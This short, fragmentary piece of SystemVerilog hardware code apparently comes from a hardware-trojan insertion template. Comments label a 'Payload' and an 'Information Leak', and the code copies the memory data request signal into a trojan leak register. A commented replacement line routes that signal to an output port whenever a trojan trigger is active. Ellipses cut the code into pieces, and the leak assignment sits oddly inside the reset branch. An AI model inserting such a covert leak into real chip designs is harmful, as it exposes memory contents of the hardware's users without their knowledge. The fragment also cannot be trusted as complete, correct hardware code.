 ...
 * Payload: Route mem_data_req_o to leak port
 * 
...
always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        ...
        trojan_leak_data <= mem_data_req_o;
    end
end
...
// ============================================================
// Information Leak: Route mem_data_req_o to unused output
//
...
//   Replace: assign output_signal = trojan_active ? mem_data_req_o : normal_value;